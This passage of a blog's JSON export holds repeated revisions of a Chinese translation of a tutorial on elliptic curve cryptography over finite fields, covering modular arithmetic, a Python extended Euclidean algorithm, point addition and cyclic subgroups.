0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的基础, \\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277522570,"created_at":"2019-12-25 12:38:42"},{"id":"5e03586a2ee0ee0001819d41","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 